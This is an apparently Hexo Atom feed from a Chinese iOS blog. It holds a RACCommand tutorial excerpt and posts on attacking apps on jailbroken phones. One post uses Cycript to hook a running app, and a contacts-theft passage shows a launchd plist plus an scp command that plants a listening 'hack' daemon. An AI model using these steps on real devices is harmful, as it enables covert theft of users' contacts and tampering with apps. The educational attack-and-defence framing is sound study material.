class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>这看起来真是一大坨~看还是从小的地方来看吧。我们真正感兴趣RACCommand<code>RACCommand</code>创建部分是以下代码：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">- (RACCommand *)subscribeCommand &#123;</div><div class="line">  <span class="keyword">if</span> (!_subscribeCommand) &#123;</div><div class="line">      <span class="built_in">NSString</span> *email = <span class="keyword">self</span>.email;</div><div class="line">      _subscribeCommand = [[RACCommand alloc] initWithEnabled:<span class="keyword">self</span>.emailValidSignal signalBlock:^RACSignal *(<span class="keyword">id</span> input) &#123;</div><div class="line">          <span class="keyword">return</span> [SubscribeViewModel postEmail:email];</div><div class="line">      &#125;];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> _subscribeCommand;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Command通过一个<code>enabledSignal</code>参数来初始化。这个Signal可以指示Command是否可以被执行。在我们本次的用例中Command应该在用户合法输入email时允许被执行。<code>self.emailValidSignal</code>就是用来在email发生变化发送<code>NO</code>或者<code>YES</code>指示的。</p>
<p><code>signalBlock</code>参数在Command需要执行时被调用。block应该返回一个signal。当我们设置<code>allowsConcurrentExecution</code>为<code>NO</code>，Command将会看守这个signal并且在本次执行未完成前不允许任何新的执行。</p>
<p>由于本次用例中的Command来自于按钮的<code>rac_command</code>（在<code>UIButtton+RACCommandSupport</code>分类中定义），根据Command是否可以被执行，按钮会自动切换<code>enabled</code>和<code>disabled</code>状态。</p>
<p>当然，Command会在按钮被用户点击的时候自动执行。我们可以通过RACCommand自由的实现这一切。如果你需要手动执行你可以调用<code>-[RACCommand execute:]</code>，参数是可选的，你可以传递nil。我们的用例里不需要参数，不过这里的参数通常会十分有用（按钮可以将自己当做<code>-execute:</code>的参数传入）。<code>-execute:</code>方法也是一个你可以监控执行状态的地方，你可以这样写：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[[<span class="keyword">self</span>.viewModel.subscribeCommand execute:<span class="literal">nil</span>] subscribeCompleted:^&#123;</div><div class="line">  <span class="built_in">NSLog</span>(<span class="string">@"The command executed"</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>在我们的用例中按钮为我们调用Command的执行（所以我们不需要手动调用<code>-execute:</code>），所以在Command执行时，为了及时更新UI，我们需要监听Command的另一个属性。我们有几种让人迷惑的地方，<code>RACCommand</code>的<code>executionSignals</code>属性是一个每当Commands开发执行时就发送<code>next:</code>的Signal。问题在于Signal由Command创建，所以Signal中还有一层Signal。每次Command开始执行的时候， 我们会在ViewModel中通过<code>mapSubscribeCommandStateToStatusMessage</code>方法里面获取到一个信号。同时在这个信号里面返回了一个字符串：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RACSignal *startedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals map:^<span class="keyword">id</span>(RACSignal *subscribeSignal) &#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Sending request..."</span>, <span class="literal">nil</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>假如我们想用更函数的方式，来在Command执行完成后都能获取string，我们需要做更多的工作：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">RACSignal *completedMessageSource = [<span class="keyword">self</span>.subscribeCommand.executionSignals flattenMap:^RACStream *(RACSignal *subscribeSignal) &#123;</div><div class="line">  <span class="keyword">return</span> [[[subscribeSignal materialize] filter:^<span class="built_in">BOOL</span>(RACEvent *event) &#123;</div><div class="line">      <span class="keyword">return</span> event.eventType == RACEventTypeCompleted;</div><div class="line">  &#125;] map:^<span class="keyword">id</span>(<span class="keyword">id</span> value) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Thanks"</span>, <span class="literal">nil</span>);</div><div class="line">  &#125;];</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>当Command执行时，<code>flattenMap:</code>方法调用一个带<code>subscribeSignal</code>参数的block。这个block返回一个新的Signal并且它的值会被传递到下一个返回信号。<code>materialize</code>操作符让我们捕获到一个<code>RACEvent</code>（例如 <code>next:</code> <code>complete</code> 和 <code>error:</code>都是RACEvent的实例）。我们可以在信号完成之后过滤这些<code>event</code>并且映射成一个string。这些解释让你晕了吗，不过你可以去看一下<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/d4924b237720afef62c1334437140bb803fb5242/ReactiveCocoaFramework/ReactiveCocoa/RACStream.h#L98" target="_blank" rel="external">flattenMap:</a>和<a href="https://github.com/ReactiveCocoa/ReactiveCocoa/blob/2d5f163547f2b9c6ee25cf2c9ff8554faf7929f2/ReactiveCocoaFramework/ReactiveCocoa/RACSignal%2BOperations.h#L558" target="_blank" rel="external">materialize</a>的文档以助于你的理解。</p>
<p>我们可以用另一种不同但更容易理解的方式来实现：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@weakify(<span class="keyword">self</span>);</div><div class="line">[<span class="keyword">self</span>.subscribeCommand.executionSignals subscribeNext:^(RACSignal *subscribeSignal) &#123;</div><div class="line">  [subscribeSignal subscribeCompleted:^&#123;</div><div class="line">      @strongify(<span class="keyword">self</span>);</div><div class="line">      <span class="keyword">self</span>.statusMessage = <span class="string">@"Thanks"</span>;</div><div class="line">  &#125;];</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>但是我并不喜欢上面的写法，因为这样会block中的操作会更多并且会更多的在block中使用到<code>self</code>。所以在这里还使用了<code>@weakify</code>和<code>@strongify</code>（在<code>libextobjc</code>中定义）避免循环retain。</p>
<p>关于<code>executionSignals</code>属性，有一个重要的细节。在这里的Signal所发送的event不包含<code>error</code>，所以对于那些有特殊<code>errors</code>属性</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RACSignal *failedMessageSource = [[<span class="keyword">self</span>.subscribeCommand.errors subscribeOn:[RACScheduler mainThreadScheduler]] map:^<span class="keyword">id</span>(<span class="built_in">NSError</span> *error) &#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">NSLocalizedString</span>(<span class="string">@"Error :("</span>, <span class="literal">nil</span>);</div><div class="line">&#125;];</div></pre></td></tr></table></figure>
<p>如果我们有三个带有状态消息的Signal，我们可以将他们合并陈搞一个信号并绑定到ViewModel的一个<code>statusMessage</code>属性 (<code>statusMessage</code>绑定ViewController的statusLabel.text)。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RAC(<span class="keyword">self</span>, statusMessage) = [RACSignal merge:@[startedMessageSource, completedMessageSource, failedMessageSource]];</div></pre></td></tr></table></figure>
<p>那么以上是一个<code>RACCommand</code>在iOS app 开发中的一个example。我相信这种实现逻辑比使用<code>UITextFieldDelegate</code>有更多的优点，能在属性和变量中体现更多的状态。</p>
<h1 id="其他有趣的RACCommand使用细节"><a href="#其他有趣的RACCommand使用细节" class="headerlink" title="其他有趣的RACCommand使用细节"></a>其他有趣的RACCommand使用细节</h1><p><code>RACCommand</code>有一个<code>executing</code>属性，实际上它是一个当<code>execute:</code>时会发送<code>YES</code>，终止时发送<code>NO</code>的信号。在订阅信号时这个信号将会发送它的当前值，如果你只需要获取当前值而不需要获得信号，你可以通过以下方式：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> commandIsExecuting = [[command.executing first] boolValue];</div></pre></td></tr></table></figure>
<p><code>enabled</code>属性也是一个发送<code>YES</code>和<code>NO</code>的信号。当Command通过发送<code>NO</code>的<code>enabledSignal</code>信号创建，或者如果信号在执行并且<code>allowsConcurrentExecutions</code> 为 <code>NO</code>，<code>enabled</code>就会发送<code>NO</code>。</p>
<p><code>-execute:</code>方法会自动订阅原始Signal并且广播它。这意味着你不需要去订阅<code>-execute:</code>返回的信号，但是如果你订阅了也不需要担心它会被执行两次。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#99;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#111;&#x6d;">&#99;&#111;&#100;&#x65;&#114;&#x66;&#x69;&#x73;&#104;&#64;&#x31;&#54;&#51;&#x2e;&#x63;&#111;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;原文地址&quot;&gt;&lt;a href=&quot;#原文地址&quot; class=&quot;headerlink&quot; title=&quot;原文地址&quot;&gt;&lt;/a&gt;原文地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://codeblog.shape.dk/blog/2013/12/05/reactivecocoa-essentials-understanding-and-using-raccommand/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;点击这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这几天部门的前辈再用RAC的时候问到一个问题，RACCommand在RAC中具体的作用和起到的功能，到底应该如何应用它。&lt;/p&gt;
&lt;p&gt;关于RAC的使用文章非常多，但是大多仅限于介绍和基本的使用方法，很少介绍RAC究竟应该如何优雅的嵌入到项目中。&lt;/p&gt;
&lt;p&gt;在查阅资料的时候发现了此篇博文，写的非常细致，所以做了一次搬运工。&lt;/p&gt;
&lt;p&gt;另，妹子我的英文属于渣渣系列，所以有什么翻译不当，请一定要指教。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="译文" scheme="http://zhoulingyu.com/tags/%E8%AF%91%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（三）Cycript攻·防</title>
    <link href="http://zhoulingyu.com/2016/07/19/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2/"/>
    <id>http://zhoulingyu.com/2016/07/19/iOS攻防——（三）Cycript攻·防/</id>
    <published>2016-07-19T14:09:36.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
<p>Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序。<br>Cycript是一个理解Objective-C语法的javascript解释器，它能够挂钩正在运行的进程，能够在&gt; 运行时修改应用的很多东西。</p>
<ol>
<li>能够挂钩正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第三方库，甚至程序的delegate的名称。</li>
<li>对于一个特定的类，例如View Controller, App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。</li>
<li>能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。</li>
<li>能够在运行时修改实例变量的值。</li>
<li>能够执行Method Swizzling，例如替换一个特定方法的实现。</li>
<li>可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。</li>
</ol>
</blockquote>
<a id="more"></a>
<h1 id="Cycript安装"><a href="#Cycript安装" class="headerlink" title="Cycript安装"></a>Cycript安装</h1><p>在<a href="http://www.cycript.org" target="_blank" rel="external">这里下载</a><br>在<a href="">这里阅读</a>所有Cycript诡计</p>
<h1 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h1><p>先看看怎么用Cycript干点坏事吧</p>
<h2 id="1-给应用弹一个莫名其妙的alert"><a href="#1-给应用弹一个莫名其妙的alert" class="headerlink" title="1. 给应用弹一个莫名其妙的alert"></a>1. 给应用弹一个莫名其妙的alert</h2><h3 id="ssh登陆你的手机（如果不会，上一篇有-）"><a href="#ssh登陆你的手机（如果不会，上一篇有-）" class="headerlink" title="ssh登陆你的手机（如果不会，上一篇有~）"></a>ssh登陆你的手机（如果不会，上一篇有~）</h3><h3 id="找一个app"><a href="#找一个app" class="headerlink" title="找一个app"></a>找一个app</h3><p>这里我找的是以前做的一个app</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps aux | grep blackwidow</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mobile 466 6.6 7.0 508416 36204 ?? Ss 11:22AM 0:09.65 /xxxx/blackwidow</div></pre></td></tr></table></figure>
<p>这样知道进程号是466</p>
<h3 id="hock住"><a href="#hock住" class="headerlink" title="hock住"></a>hock住</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cycript -p 466</div></pre></td></tr></table></figure>
<p>如果你看到出现了cy#，说明你可以开始编写Cycript代码了</p>
<h3 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h3><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 找到widnow</span></div><div class="line">var window = [<span class="built_in">UIApplication</span> sharedApplication].keyWindow;</div><div class="line"><span class="comment">// 初始化一个alert</span></div><div class="line">var alert = [[<span class="built_in">UIAlertView</span> alloc] initWithTitle:<span class="string">@"hack you"</span> message:<span class="string">@"hack you"</span> window cancelButtonTitle:<span class="string">@"cancel"</span> otherButtonTitles:<span class="string">@"yes"</span>, <span class="literal">nil</span>];</div><div class="line"><span class="comment">// 弹出来吧</span></div><div class="line">[alert show];</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-01.PNG-w375" alt=""></p>
<h2 id="2-探索一个app"><a href="#2-探索一个app" class="headerlink" title="2. 探索一个app"></a>2. 探索一个app</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">  <span class="keyword">var</span> methods = class_copyMethodList(objc_getClass(className), count);</div><div class="line">  <span class="keyword">var</span> methodsArray = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</div><div class="line">    <span class="keyword">var</span> method = methods[i];</div><div class="line">    methodsArray.push(&#123;<span class="attr">selector</span>:method_getName(method), <span class="attr">implementation</span>:method_getImplementation(method)&#125;);</div><div class="line">  &#125;</div><div class="line">  free(methods);</div><div class="line">  <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>调用一下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(AppDelegate)</div></pre></td></tr></table></figure></p>
<p>输出结果：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>是不是觉得发生了很可怕的事情？该有的都被打印出来了。</p>
<p>你还可以通过试探的方式找出每一个Controller的名字，例如：</p>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> homeVC= [[[[[UIApplication sharedApplication] keyWindow] subviews] objectAtIndex:<span class="number">0</span>] nextResponder];</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;HomePageTabBarViewController: 0x156cf200&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> page0VC = [homeVC.childViewControllers objectAtIndex:<span class="number">3</span>]</div></pre></td></tr></table></figure>
<p>print</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;BaseNavigationController: 0x156decc0&gt;&quot;</div></pre></td></tr></table></figure>
<p>insert<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var meVC = page0VC.topViewController</div></pre></td></tr></table></figure></p>
<p>print<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&quot;&lt;MeViewController: 0x156de940&gt;&quot;</div></pre></td></tr></table></figure></p>
<p>这样，我们就找到了『我的』页面所属Controller。</p>
<p>查看所有的方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">printMethods(MeViewController)</div></pre></td></tr></table></figure>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-02.png" alt=""></p>
<p>改个标题试试：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[meVC setCurrentTitle:<span class="string">@"hack you"</span>];</div></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%89%EF%BC%89Cycript%E6%94%BB%C2%B7%E9%98%B2-04.PNG-w375" alt=""></p>
<p>试想一下，如果MeViewController中或者LoginViewController中有一个方法叫getUserInfo，那么通过Cycript就可以轻而易举的拿到用户信息。</p>
<p>不过Cycript在这里最主要的作用还是偷窥APP和调试APP。<br>当然，好玩的方法还有很多。</p>
<h1 id="防"><a href="#防" class="headerlink" title="防"></a>防</h1><p>知道了Cycript的可怕，在有重要信息藏在代码中的时候，我们也得学会如何放置Cycript修改运行时。</p>
<p>你可以参考<a href="http://www.cocoachina.com/ios/20150511/11801.html" target="_blank" rel="external">这篇文章</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x63;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#104;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;">&#x63;&#111;&#100;&#x65;&#x72;&#102;&#105;&#115;&#104;&#x40;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Cycript允许开发人员探讨和修改iOS和Mac OS X上运行的应用程序。&lt;br&gt;Cycript是一个理解Objective-C语法的javascript解释器，它能够挂钩正在运行的进程，能够在&amp;gt; 运行时修改应用的很多东西。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能够挂钩正在运行的进程，并且找出正被使用的类信息，例如view controllers，内部和第三方库，甚至程序的delegate的名称。&lt;/li&gt;
&lt;li&gt;对于一个特定的类，例如View Controller, App delegate或者任何其他的类，我们能够得到所有被使用的方法名称。&lt;/li&gt;
&lt;li&gt;能够得到所有实例变量的名称和在程序运行的任意时刻实例变量的值。&lt;/li&gt;
&lt;li&gt;能够在运行时修改实例变量的值。&lt;/li&gt;
&lt;li&gt;能够执行Method Swizzling，例如替换一个特定方法的实现。&lt;/li&gt;
&lt;li&gt;可以在运行时调用任意方法，即使这个方法目前并不在应用的实际代码当中。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/categories/iOS/iOS%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（二）如何窃取用户的通讯录信息</title>
    <link href="http://zhoulingyu.com/2016/07/12/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84%E9%80%9A%E8%AE%AF%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>http://zhoulingyu.com/2016/07/12/iOS攻防——（二）如何窃取用户的通讯录信息/</id>
    <published>2016-07-12T21:31:24.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>2016年7月15更新，最近试了一下，发现用nc拿不到数据了，拿数据的代码是没有问题的，直接运行可以拿到数据，但是从mac通过IP和端口拿到的.sqlitedb文件是空文件，博主也正在看为什么~大家有兴趣可以一起找一下原因。</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章基于念茜的iOS攻防系列。<br>本文将会讲解如何窃取用户的通讯录信息。<br>同样在越狱手机环境下。</p>
<h1 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h1><h2 id="1-需要一个plist"><a href="#1-需要一个plist" class="headerlink" title="1. 需要一个plist"></a>1. 需要一个plist</h2><p>需要这样一个plist，它看起来是这样：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png" alt=""></p>
<a id="more"></a>
<p>源文件是这样：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Program<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardErrorPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/null<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>SessionCreate<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/bin/hack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>inetdCompatibility<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Wait<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">false</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Sockets<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Listeners<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">key</span>&gt;</span>SockServiceName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>55<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>SockServiceName指的是通信名称<br>将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/zhoulingyu/Desktop/hack.plist root@192.168.31.152:/System/Library/LaunchDaemons/hack.plist</div></pre></td></tr></table></figure>
<h2 id="2-了解一下OS-X的启动原理"><a href="#2-了解一下OS-X的启动原理" class="headerlink" title="2. 了解一下OS X的启动原理"></a>2. 了解一下OS X的启动原理</h2><blockquote>
<ol>
<li>mac固件激活，初始化硬件，加载BootX引导器。</li>
<li>BootX加载内核与内核扩展(kext)。</li>
<li>内核启动launchd进程。</li>
<li>launchd根据/System/Library/LaunchAgents、/System/Library/LaunchDaemons、/Library/LaunchDaemons、Library/LaunchAgents、~/Library/LaunchAgents里的plist配置，启动服务守护进程</li>
</ol>
</blockquote>
<p>解释一下：</p>
<blockquote>
<p>LaunchDaemons是用户未登陆前就启动的服务（守护进程）<br>LaunchAgents是用户登陆后启动的服务（守护进程）</p>
</blockquote>
<p>几个目录下plist文件格式及每个字段的含义：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Key</th>
<th style="text-align:left">Description</th>
<th style="text-align:center">Required</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Label</td>
<td style="text-align:left">The name of the job</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">ProgramArguments</td>
<td style="text-align:left">Strings to pass to the program when it is executed</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">UserName</td>
<td style="text-align:left">The job will be run as the given user, who may not necessarily be the one who submitted it to launchd.</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">inetdCompatibility</td>
<td style="text-align:left">Indicates that the daemon expects to be run as if it were launched by inetd</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">Program</td>
<td style="text-align:left">The path to your executable. This key can save the ProgramArguments key for flags and arguments.</td>
